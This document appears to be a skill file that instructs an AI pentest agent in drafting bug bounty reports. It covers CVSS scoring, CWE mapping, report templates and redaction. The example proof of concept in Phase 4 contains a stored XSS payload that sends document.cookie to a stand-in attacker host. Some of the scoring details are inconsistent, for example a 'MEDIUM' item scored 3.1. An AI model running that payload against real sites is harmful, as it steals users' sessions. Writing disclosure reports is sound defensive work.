---
name: report-bug-bounty
description: Bug bounty report drafting from existing redacted evidence, findings, and observations — produces platform-ready reports (HackerOne, Bugcrowd, Intigriti) with CVSS scoring, CWE mapping, reproduction steps, impact analysis, and remediation guidance. Requires completed findings (from pentest_agent_record_finding) and redacted evidence. Never includes raw proof file content, raw secrets, or PII. Report structure adapts to severity, platform requirements, and disclosure policy.
disable-model-invocation: true
risk: report-only
allowed-modes: [bug-bounty]
authorization-required: no
evidence-outputs: [report, finding-summary, redaction-notes]
---

# Bug bounty report drafting — structured vulnerability disclosure

Use this skill to draft bug bounty reports from verified, redacted findings and evidence. Reports must be clear, reproducible, properly scored, and platform-compliant. A good report makes the triager's job easy: describe the vulnerability, prove it exists, explain the impact, and suggest a fix. This skill synthesizes findings from `pentest_agent_record_finding`, evidence from `pentest_agent_append_evidence`, and redacted output from `pentest_agent_redact_evidence` into a submission-ready document. It never creates findings from scratch — all findings must already exist in the local finding store.

## Required inputs

- Findings list from `pentest_agent_list_findings` filtered to confirmed or likely confidence.
- Evidence records referenced by each finding.
- Scope file to confirm in-scope status and provide program context.
- Platform target: HackerOne, Bugcrowd, Intigriti, or direct email disclosure.
- Disclosure policy: coordinated (private first), full public, or program-specific rules.

## Required gates

1. `pentest_agent_load_config` and `pentest_agent_validate_policy` to verify redaction and reporting policy.
2. `pentest_agent_list_findings` to load the finding inventory.
3. `pentest_agent_list_evidence` to load evidence records for each finding.
4. `pentest_agent_redact_evidence` for a final redaction pass before including evidence in the report.
5. `pentest_agent_render_report` to produce the final document.
6. No authorization cache required — this is report drafting, not active testing.

## Workflow

### Phase 1 — finding selection and prioritization

Review the finding inventory and select which findings to report.

1. **Filter by confidence**: only include `confirmed` and `likely` findings. `needs-review` findings require additional validation before reporting.
2. **Filter by scope**: only report in-scope findings. Out-of-scope findings should be documented separately as informational appendices only if the program requests them.
3. **Deduplicate**: if multiple findings share the same root cause, consolidate into a single report with multiple impact paths. Example: a missing authorization check on `/api/users/{id}` allows accessing any user's data — this is one finding (IDOR), not one per user ID.
4. **Prioritize severity** (descending): critical, high, medium, low, info. Criticals and highs get the most detailed reports. Lows and infos can be batched if the program allows multi-finding reports.
5. **Review finding metadata**: each finding must have a title, severity, CVSS vector (or justification for not using CVSS), CWE identifier, affected assets, evidence references, reproduction steps, impact description, and remediation recommendation.

### Phase 2 — CVSS scoring

Assign CVSS v4.0 scores to each reported finding. CVSS provides a standardized severity measure that platforms and triage teams use to prioritize.

1. **CVSS v4.0 base metrics** (attack vector, attack complexity, attack requirements, privileges required, user interaction, scope, confidentiality impact, integrity impact, availability impact):
   - **Attack Vector (AV)**:
     - Network (N): exploitable over the network (most web vulns).
     - Adjacent (A): requires same network segment (ARP spoofing, some SSRF).
     - Local (L): requires local access (some privilege escalation).
     - Physical (P): requires physical device access.
   - **Attack Complexity (AC)**:
     - Low (L): no special conditions needed (simple SQL injection).
     - High (H): requires specific conditions or user interaction setup.
   - **Privileges Required (PR)**:
     - None (N): unauthenticated attacker.
     - Low (L): authenticated as basic user.
     - High (H): requires admin privileges.
   - **User Interaction (UI)**:
     - None (N): no user interaction (direct HTTP request).
     - Passive (P): user performs normal action (clicking a link in XSS).
     - Active (A): user performs unusual action (installing a malicious extension).
   - **Scope (S)**:
     - Unchanged (U): vulnerability affects only the vulnerable component.
     - Changed (C): vulnerability allows escaping the component's security boundary.
   - **Confidentiality (C), Integrity (I), Availability (A)**:
     - None (N): no impact.
     - Low (L): limited impact (partial data, limited modification).
     - High (H): total impact (full data access, complete modification, total denial).
2. **CVSS v4.0 severity ranges**:
   - Critical: 9.0 – 10.0
   - High: 7.0 – 8.9
   - Medium: 4.0 – 6.9
   - Low: 0.1 – 3.9
   - None: 0.0
3. **Common scenarios**:
   - **Stored XSS in unauthenticated form → reflected to all users**: AV:N, AC:L, PR:N, UI:P, S:C, C:L/I:L/A:N → ~8.7 (High)
   - **SQL injection → full database dump**: AV:N, AC:L, PR:N, UI:N, S:C, C:H/I:H/A:N → ~9.9 (Critical)
   - **IDOR → access other users' PII**: AV:N, AC:L, PR:L, UI:N, S:U, C:H/I:N/A:N → ~6.5 (Medium) — note: IDOR severity depends on data sensitivity.
   - **Reflected XSS with no CSP**: AV:N, AC:L, PR:N, UI:A, S:C, C:L/I:L/A:N → ~6.1 (Medium)
   - **Open redirect without token theft potential**: AV:N, AC:L, PR:N, UI:A, S:U, C:N/I:L/A:N → ~4.7 (Medium)
4. **When not to use CVSS**: if the finding is informational (no direct security impact but worth noting), assign "none" severity and explain why. If the program uses a different severity system (e.g., Bugcrowd's VRT), map CVSS to that system.

### Phase 3 — CWE and CAPEC mapping

Map each finding to a Common Weakness Enumeration (CWE) entry. This helps triage teams categorize the finding and cross-reference with known vulnerability patterns.

1. **Common CWE mappings**:
   | Vulnerability | Recommended CWE |
   |---|---|
   | SQL Injection | CWE-89 |
   | Cross-Site Scripting (XSS) | CWE-79 |
   | Cross-Site Request Forgery (CSRF) | CWE-352 |
   | Insecure Direct Object Reference (IDOR) | CWE-639 |
   | Server-Side Request Forgery (SSRF) | CWE-918 |
   | Path Traversal | CWE-22 |
   | Command Injection | CWE-78 |
   | Information Exposure | CWE-200 |
   | Missing Authentication | CWE-306 |
   | Broken Access Control | CWE-284 |
   | Sensitive Data Exposure | CWE-311 |
   | XML External Entity (XXE) | CWE-611 |
   | Deserialization of Untrusted Data | CWE-502 |
   | Server-Side Template Injection (SSTI) | CWE-94 |
   | Open Redirect | CWE-601 |
   | Unrestricted File Upload | CWE-434 |
   | Use of Hard-coded Credentials | CWE-798 |
   | Missing Encryption of Sensitive Data | CWE-319 |
2. **If no exact CWE matches**: use the closest parent category and note in the report that the mapping is approximate.
3. **CAPEC (Common Attack Pattern Enumeration and Classification)**: optionally map to CAPEC for attack-pattern-level description. This is more valuable for CTF write-ups or internal red-team reports.

### Phase 4 — report structure

Build the report in the format expected by the target platform.

1. **Title**: concise, vulnerability-type focused, with affected component.
   - Good: `Stored XSS in /profile/bio field allows account takeover via cookie theft`
   - Avoid: `XSS found` (too vague), `Critical vulnerability in your app` (clickbait).
2. **Summary** (1-2 sentences): what the vulnerability is, where it is, and what an attacker can do with it.
3. **Affected assets**: specific URL(s), endpoint(s), parameter(s), or component(s). Include HTTP method, path, and parameter if applicable.
4. **Severity and scoring**:
   - CVSS v4.0 vector string: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N`
   - Base score and severity label.
   - CWE identifier.
5. **Description**: technical explanation of the vulnerability. What the application does incorrectly. What the expected behavior is. How this class of vulnerability is typically exploited.
6. **Proof of Concept** (step-by-step reproduction):
   - Step 1: Navigate to `https://TARGET.COM/login`.
   - Step 2: Log in with the following credentials (test account): `testuser:testpass`.
   - Step 3: Navigate to `https://TARGET.COM/profile`.
   - Step 4: In the "Bio" field, enter the following payload: `<script>fetch('https://ATTACKER-COLLABORATOR.com?c='+document.cookie)</script>`
   - Step 5: Save the profile.
   - Step 6: Log out and log in as a different user. Navigate to the attacker's profile. Observe that the JavaScript executes and the victim's cookies are sent to the collaborator.
   - Attach screenshots or video evidence (redacted).
7. **Impact**: what an attacker can realistically achieve. Be specific:
   - Instead of: "An attacker could steal data."
   - Use: "An attacker exploiting this stored XSS can steal session cookies from any user viewing the infected profile, leading to full account takeover. If an administrator views the profile, the attacker gains administrative access to the application."
8. **Remediation**: specific, actionable fix guidance:
   - Instead of: "Sanitize input."
   - Use: "HTML-encode the bio field before rendering it in the profile page. Use a context-aware encoding library (e.g., OWASP Java Encoder for Java, DOMPurify for client-side rendering). Apply a Content-Security-Policy header with `script-src 'self'` to prevent execution of inline scripts even if an XSS payload bypasses encoding. Additionally, set cookies with the `HttpOnly` flag to prevent JavaScript access to session cookies."
9. **References**: links to CWE, OWASP, vendor documentation, or relevant research that supports the finding.

### Phase 5 — platform-specific formatting

1. **HackerOne**:
   - Use Markdown formatting (H1 supports Markdown in reports).
   - Attach screenshots inline with `![description](url)`.
   - Use code blocks for payloads and HTTP requests/responses.
   - Submit one finding per report unless the program explicitly allows multi-finding reports.
   - Set severity accurately — triage teams penalize inflated severity.
2. **Bugcrowd**:
   - Bugcrowd uses the Vulnerability Rating Taxonomy (VRT) in addition to CVSS.
   - Map the finding to the closest VRT category.
   - Bugcrowd reports support Markdown.
3. **Intigriti**:
   - Similar to HackerOne. Markdown support.
4. **Direct email disclosure**:
   - Include a PGP key if the program's security.txt specifies one.
   - Send from a professional email address.
   - Include a disclosure timeline and offer a 90-day coordinated disclosure window.
   - If no response within 14 days, follow up. Document all communication attempts.

### Phase 6 — redaction and final review

Before submitting, perform a final redaction pass.

1. **Redaction checklist**:
   - Raw secret values, API keys, tokens, passwords → REDACTED or replaced with `<REDACTED>`.
   - Session cookies or auth tokens in HTTP request/response examples → replaced with stand-in values.
   - Personal information (names, email addresses, phone numbers) → redacted unless they are part of the test account.
   - Internal hostnames or IPs not already in the scope → redacted or replaced with `internal-host.example.com`.
   - Proof file content or screenshot metadata → never included in raw form.
   - Collaborator/Burp Collaborator URLs → replace with `ATTACKER-COLLABORATOR.com` in public PoC, keep original in private notes.
2. **Review against program rules**:
   - Does the report include only in-scope assets?
   - Were any prohibited methods used to discover the vulnerability?
   - Does the PoC avoid destructive or disruptive steps?
   - Is the report clear enough for a triage team to reproduce in under 30 minutes?
3. **Store a local copy** under `.pi/pentest-agent/engagements/<id>/reports/` before submission.

## Decision points

- **Finding is out-of-scope but significant**: document separately. Some programs accept out-of-scope findings as informational or offer partial bounty for them. Check program policy.
- **Finding is a duplicate of a known report**: search the program's public disclosures and issue tracker before submitting. If likely a duplicate, note it and consider whether your PoC offers new information.
- **Finding relies on an unrealistic user action** (e.g., "user must install malicious extension"): the severity should reflect the user interaction requirement. CVSS v4.0 Active user interaction lowers the score.
- **Program has a known issue with similar reports**: if the program has publicly stated "we do not accept CSRF reports on logout endpoints", do not submit CSRF-on-logout. Read the program's exclusions.
- **Report includes a video PoC**: great for demonstrating complex exploits. Host the video on a platform that does not leak metadata (YouTube unlisted, not public). Never include raw screen recording with visible API keys or session data.

## Prohibited behavior

- Submitting findings that are not confirmed or lack reproducible evidence.
- Including raw proof file content, raw secrets, passwords, or API keys in the report.
- Submitting findings against out-of-scope assets unless the program explicitly accepts out-of-scope submissions.
- Exaggerating severity to inflate bounty potential — this damages reporter credibility.
- Publicly disclosing the vulnerability before the program's disclosure policy allows.
- Including malicious or destructive payloads in the PoC that could affect other users or the production environment.
- Submitting automated or mass-generated reports without human review.

## Report template

```markdown
# [Vulnerability Type] in [Affected Component]

## Summary
[1-2 sentence description of the vulnerability, affected asset, and impact]

## Affected Assets
- `https://TARGET.COM/api/v1/users/123` (GET, unauthenticated)
- Parameter: `id` in URL path

## Severity
- **CVSS v4.0**: `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- **Base Score**: 6.5 (Medium)
- **CWE**: CWE-639 (Insecure Direct Object Reference)

## Description
[Technical explanation of the vulnerability. What the application does incorrectly. Why it's a security issue.]

## Proof of Concept
1. Log in to the application as User A at `https://TARGET.COM/login`.
2. Navigate to User A's profile: `https://TARGET.COM/api/v1/users/42`. Observe that the API returns User A's data.
3. Change the user ID in the URL to `43`: `https://TARGET.COM/api/v1/users/43`.
4. Observe that the API returns User B's data without validating that User A is authorized to access it.
5. An attacker can enumerate user IDs sequentially and access all users' profile data, including PII.

### HTTP Request
```
GET /api/v1/users/43 HTTP/1.1
Host: TARGET.COM
Cookie: session=<REDACTED>
```

### HTTP Response (truncated)
```json
{
  "id": 43,
  "email": "user-b@example.com",
  "full_name": "User B",
  "address": "<REDACTED>",
  "phone": "<REDACTED>"
}
```

## Impact
An authenticated attacker can access the personal data (email, full name, address, phone number) of all application users by enumerating sequential user IDs. This violates user privacy, may violate data protection regulations (GDPR, CCPA), and could enable targeted phishing or identity theft if combined with other data sources.

## Remediation
Implement server-side authorization checks on every API endpoint that accesses user-specific resources. Before returning data for user ID `N`, verify that the authenticated session belongs to user ID `N` (or that the authenticated user has administrative privileges). Deny access with HTTP 403 Forbidden if the user is not authorized.

Additionally:
- Use non-sequential, unpredictable identifiers (UUID v4) instead of sequential integers to prevent enumeration.
- Implement rate limiting on user-profile endpoints to slow down enumeration attempts.
- Log all unauthorized access attempts for monitoring and alerting.

## References
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [OWASP: Insecure Direct Object References](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
```

## Evidence template

```text
Bug bounty report for: TARGET.COM
Program: HackerOne / Target Organization Bug Bounty Program
Disclosure policy: Coordinated (90-day default, program-specific: 30-day)
Total findings in scope: 8 (1 Critical, 2 High, 3 Medium, 2 Low)

Reports drafted:
  [CRITICAL] SQL Injection in /api/v1/products?category= (CVSS 9.9, CWE-89)
  [HIGH] Stored XSS in /profile/bio (CVSS 8.7, CWE-79)
  [HIGH] IDOR in /api/v1/orders/{id} (CVSS 7.5, CWE-639)
  [MEDIUM] Open Redirect in /logout?next= (CVSS 4.7, CWE-601)
  [MEDIUM] Missing CSP header on all pages (CVSS 3.1, CWE-1021)
  [MEDIUM] Rate limiting not enforced on /api/v1/login (CVSS 5.3, CWE-307)
  [LOW] Server header reveals Apache version (CVSS 2.1, CWE-200)
  [LOW] Cookie without Secure flag on non-HTTPS pages (CVSS 2.6, CWE-614)

Redaction notes:
  - All session cookies replaced with <REDACTED>
  - User PII in HTTP response examples replaced with <REDACTED>
  - Collaborator URLs replaced with ATTACKER-COLLABORATOR.com
  - Internal IPs in error messages redacted

Submissions:
  - Report #1 (SQLi): submitted 2024-01-16, triaged 2024-01-17, bounty awarded
  - Report #2 (Stored XSS): submitted 2024-01-16, pending triage
  - Reports #3-8: drafting in progress
```

## Handoff

1. Store all report drafts under `.pi/pentest-agent/engagements/<id>/reports/`.
2. `pentest_agent_export_report` for each submitted report as a local archive copy.
3. Track submission status in the engagement state.
4. Explicitly note: all reports were drafted from existing findings and redacted evidence, no raw proof content or secrets were included, CVSS scores reflect genuine impact, and all findings were confirmed in-scope before drafting.
